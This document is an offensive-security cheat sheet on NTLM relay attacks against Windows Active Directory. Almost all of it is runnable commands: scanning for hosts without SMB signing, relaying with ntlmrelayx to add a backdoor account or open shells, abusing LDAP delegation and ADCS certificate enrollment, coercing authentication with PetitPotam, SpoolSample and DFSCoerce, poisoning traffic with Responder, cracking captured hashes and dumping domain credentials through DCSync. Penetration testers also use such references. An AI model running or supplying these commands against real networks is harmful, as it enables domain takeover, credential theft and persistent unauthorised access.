# NTLM Relay — Chain Setup, Coercion Methods, Target Selection

---

## Pre-conditions check

```bash
# 1. Find hosts without SMB signing (relay targets)
crackmapexec smb <subnet>/24 --gen-relay-list relay_targets.txt
nmap --script smb2-security-mode -p 445 <subnet>/24 | grep -B5 "signing: disabled"

# 2. Confirm NTLM is accepted (not blocked by EPA/channel binding)
# Windows Server 2019+: some configs require extended protection → test first

# 3. LDAP signing: required on DCs by default on 2022+
# Test: impacket-ntlmrelayx -t ldap://<dc_ip> --no-smb-server ...
```

---

## Setup (attacker host)

```bash
# Disable SMB and HTTP on attacker (prevents Responder from breaking relay)
# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off

# Start ntlmrelayx
# Basic — relay to specific host, exec command
impacket-ntlmrelayx -t smb://<relay_target> -smb2support -c "net user backdoor P@ss123! /add"

# Relay to list of targets
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Interactive SMB shell on successful relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# Shell accessible: nc 127.0.0.1 11000

# SOCKS proxy through relayed session
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
# Use: proxychains crackmapexec smb <target> -u '' -p ''

# Relay to LDAP (create computer account, RBCD abuse)
impacket-ntlmrelayx -t ldap://<dc_ip> --no-smb-server --no-wcf-server -smb2support --delegate-access

# Relay to ADCS HTTP endpoint (ESC8)
impacket-ntlmrelayx -t http://<ADCS-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## Coercion methods

Trigger NTLM authentication from victim to attacker. Use after ntlmrelayx is running.

```bash
# Coercer — tries all known methods automatically
python3 Coercer.py coerce -u user -p pass -d domain.local -t <victim> -l <attacker_ip>
python3 Coercer.py coerce -u user -H :NTLM -d domain.local -t <victim> -l <attacker_ip>

# Specific methods:
# PetitPotam (MS-EFSRPC) — works on unpatched DCs, doesn't need auth on old versions
python3 PetitPotam.py -u user -p pass -d domain.local <attacker_ip> <dc_ip>

# PrinterBug / SpoolSample (MS-RPRN) — requires authenticated user
python3 SpoolSample.py <dc_ip> <attacker_ip>
impacket-rpcdump <dc_ip> | grep -A1 spoolsv   # verify spooler running

# DFSCoerce (MS-DFSNM) — newer, less detectable
python3 dfscoerce.py -u user -p pass <attacker_ip> <dc_ip>
```

---

## Responder (passive capture)

Wait for NTLM auth from network traffic (NBT-NS/MDNS/LLMNR poisoning). Slower but no active coercion needed.

```bash
# Full capture mode (SMB + HTTP on)
sudo responder -I eth0 -wv

# Capture only — don't relay (use alongside ntlmrelayx with Responder SMB=Off)
sudo responder -I eth0 -A   # analyze mode — log without responding

# Output: /usr/share/responder/logs/
# NTLMv2 hashes: hashcat -m 5600 ntlmv2.txt rockyou.txt
```

Responder and ntlmrelayx conflict on port 445. Run ntlmrelayx for relay; Responder with SMB=Off for capture only.

---

## Relay target selection strategy

| Target type | Relay action | Impact |
|-------------|-------------|--------|
| Workstation without signing | SMB exec | Local admin code execution |
| Server without signing | SMB exec | Server-level access |
| ADCS HTTP endpoint | Certificate request | Domain auth certificate (→ DCSync) |
| LDAP (DC, no channel binding) | Create computer account | RBCD → DA impersonation |
| LDAP + delegate-access | RBCD setup | Impersonate any user to target |

Priority: ADCS relay (ESC8) > LDAP relay > SMB relay.

---

## Post-relay checklist

```bash
# SMB relay success → verify local admin
crackmapexec smb <relay_target> -u backdoor -p 'P@ss123!'

# LDAP relay → created computer account EVIL$
# Use for RBCD: see references/kerberos-attacks.md §RBCD

# ADCS relay → got DC certificate
certipy auth -pfx dc.pfx -domain domain.local -username dc$ -dc-ip <dc_ip>
impacket-secretsdump -k -no-pass domain.local/dc$@<dc_ip>   # DCSync

# Clean up after relay (if authorized engagement requires it)
net user backdoor /delete   # remove added account
```
